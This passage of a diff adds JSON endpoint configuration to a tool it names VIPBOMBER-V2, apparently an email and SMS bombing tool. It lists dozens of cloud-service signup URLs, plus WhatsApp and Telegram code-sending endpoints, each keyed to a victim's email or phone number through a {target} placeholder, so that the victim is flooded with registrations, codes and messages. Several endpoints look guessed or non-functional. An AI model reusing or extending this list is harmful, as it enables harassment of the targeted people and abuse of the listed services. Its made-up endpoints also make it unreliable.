+                },
+                "identifier": "success"
+            },
+            {
+                "name": "siteground_mail",
+                "method": "POST",
+                "url": "https://www.siteground.com/signup",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "digitalocean_mail",
+                "method": "POST",
+                "url": "https://cloud.digitalocean.com/registrations",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "aws_mail",
+                "method": "POST",
+                "url": "https://portal.aws.amazon.com/billing/signup",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "azure_mail",
+                "method": "POST",
+                "url": "https://signup.azure.com/signup",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "google_cloud_mail",
+                "method": "POST",
+                "url": "https://cloud.google.com/free/",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "ibm_cloud_mail",
+                "method": "POST",
+                "url": "https://cloud.ibm.com/registration",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "oracle_cloud_mail",
+                "method": "POST",
+                "url": "https://cloud.oracle.com/register",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "alibaba_cloud_mail",
+                "method": "POST",
+                "url": "https://account.alibabacloud.com/register/intl_register.htm",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "tencent_cloud_mail",
+                "method": "POST",
+                "url": "https://intl.cloud.tencent.com/register",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "vultr_mail",
+                "method": "POST",
+                "url": "https://my.vultr.com/register/",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "linode_mail",
+                "method": "POST",
+                "url": "https://login.linode.com/signup",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "heroku_mail",
+                "method": "POST",
+                "url": "https://signup.heroku.com/",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "netlify_mail",
+                "method": "POST",
+                "url": "https://app.netlify.com/signup",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "vercel_mail",
+                "method": "POST",
+                "url": "https://vercel.com/signup",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "firebase_mail",
+                "method": "POST",
+                "url": "https://console.firebase.google.com/",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "mongodb_mail",
+                "method": "POST",
+                "url": "https://cloud.mongodb.com/user#/atlas/register/account",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "redis_mail",
+                "method": "POST",
+                "url": "https://redis.com/redis-enterprise-cloud/signup/",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "elastic_mail",
+                "method": "POST",
+                "url": "https://cloud.elastic.co/register",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "datadog_mail",
+                "method": "POST",
+                "url": "https://www.datadoghq.com/signup/",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "newrelic_mail",
+                "method": "POST",
+                "url": "https://newrelic.com/signup",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "splunk_mail",
+                "method": "POST",
+                "url": "https://www.splunk.com/en_us/login/sign-up.html",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "sumologic_mail",
+                "method": "POST",
+                "url": "https://www.sumologic.com/signup/",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "loggly_mail",
+                "method": "POST",
+                "url": "https://www.loggly.com/signup/",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "papertrail_mail",
+                "method": "POST",
+                "url": "https://papertrailapp.com/signup",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            }
+        ]
+    },
+    "whatsapp": {
+        "multi": [
+            {
+                "name": "whatsapp_business",
+                "method": "POST",
+                "url": "https://web.whatsapp.com/api/check",
+                "data": {
+                    "cc": "{cc}",
+                    "in": "{target}",
+                    "id": "123456789012345",
+                    "mcc": "000",
+                    "mnc": "000"
+                },
+                "identifier": "status"
+            },
+            {
+                "name": "whatsapp_web",
+                "method": "POST",
+                "url": "https://web.whatsapp.com/send",
+                "data": {
+                    "phone": "{cc}{target}",
+                    "text": "Test message from VIPBOMBER-V2"
+                },
+                "identifier": "success"
+            }
+        ]
+    },
+    "telegram": {
+        "multi": [
+            {
+                "name": "telegram_auth",
+                "method": "POST",
+                "url": "https://my.telegram.org/auth/send_password",
+                "data": {
+                    "phone": "+{cc}{target}"
+                },
+                "identifier": "random_hash"
+            },
+            {
+                "name": "telegram_code",
+                "method": "POST",
+                "url": "https://my.telegram.org/auth/sign_in",
+                "data": {
+                    "phone": "+{cc}{target}",
+                    "random_hash": "random_hash",
+                    "password": "password"
+                },
+                "identifier": "success"
+            }
+        ]
+    },
+    "advanced": {
+        "multi": [
+            {
+                "name": "custom_api_1",
+                "method": "POST",
+                "url": "https://api.example.com/v1/otp/send",
+                "headers": {
+                    "Content-Type": "application/json",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+                },
+                "json": {
+                    "phoneNumber": "+{cc}{target}",
+                    "countryCode": "{cc}",
+                    "service": "vipbomber"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "custom_api_2",
+                "method": "GET",
+                "url": "https://api2.example.com/sms/send",
+                "params": {
+                    "to": "{target}",
+                    "country": "{cc}",
+                    "message": "Test OTP"
+                },
+                "identifier": "200"
+            },
+            {
+                "name": "custom_api_3",
+                "method": "PUT",
+                "url": "https://api3.example.com/notification",
+                "headers": {
+                    "Authorization": "Bearer token123",
+                    "X-API-Key": "apikey456"
+                },
+                "data": {
+                    "recipient": "+{cc}{target}",
+                    "type": "sms",
+                    "content": "VIPBOMBER-V2 Test"
+                },
+                "identifier": "accepted"
             }
         ]
     }
